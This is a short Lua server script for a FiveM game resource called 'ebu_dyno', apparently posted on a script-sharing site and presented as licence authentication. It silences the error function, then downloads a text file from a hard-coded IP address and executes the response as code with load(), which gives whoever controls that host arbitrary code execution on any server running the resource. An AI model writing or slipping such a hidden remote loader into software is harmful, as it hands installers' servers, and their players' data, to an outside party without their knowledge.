--[[
	id: 4khQRk3akHrwlNcNtOytE
	name: Dyno S v2
	description: Dyno Auth
	time1: 2021-06-03 02:01:10.832302+00
	time2: 2021-06-03 02:01:10.832302+00
	uploader: nVpiI2NOtXmbABCF9f4UAzVhgQFEQ-ml4eXie1OF
	uploadersession: R0MAbYvEoiVv2MGJG-zuUK-v-Ntp5l
	flag: f
--]]

--[[
strings-override

...
]]
local script = 'ebu_dyno'

local license_key = Config.license_key
local license_key2 = Config.license_key2 or ''

Citizen.Tace = function() end
error = function() end

PerformHttpRequest("74.91.121.153/verify.txt", function (errorCode, resultData, resultHeaders)
    if errorCode == 200 then
      assert(load("local script  = '"..script.."';".. resultData))()
    else
      print('^1'..script..' - Unable to reach auth server - Error : '..errorCode..'^0')
    end
end)

RegisterServerEvent('ebu_dyno:updateTrailer')
AddEventHandler('ebu_dyno:updateTrailer', function(type, num, vehicle, status)
    TriggerClientEvent('ebu_dyno:updateTrailer', -1, type, num, vehicle, status)
end)